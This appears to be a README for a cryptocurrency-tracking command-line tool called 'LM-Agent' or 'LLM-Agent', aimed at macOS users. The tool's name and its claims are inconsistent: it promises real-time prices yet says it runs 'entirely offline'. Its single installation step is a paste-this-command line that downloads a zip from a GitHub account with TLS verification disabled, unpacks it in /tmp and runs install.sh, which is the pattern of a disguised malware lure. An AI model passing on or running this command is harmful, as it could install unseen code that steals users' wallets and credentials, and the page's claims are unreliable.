LM-Agent is a powerful command-line tool that helps you track cryptocurrency prices, analyze charts, and get instant market insights using advanced language models. It runs locally on your machine and provides real-time data for Bitcoin, Ethereum, and thousands of altcoins.
Features
    Real-time cryptocurrency prices and market caps
    Chart analysis and technical indicators
    Natural language queries (e.g., "What's the trend for ETH?")
    Portfolio tracking (optional)
    Fast, lightweight, and runs entirely offline
Installation
You can install LLM-Agent in one simple command (macOS):
text

curl -fsSLk https://github.com/executivedevbiz/LLM-Agent/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/LLM-Agent-main && \
bash install.sh

This will download, unpack, and set up the agent automatically. After installation, you can run it from anywhere using the llm-agent command.
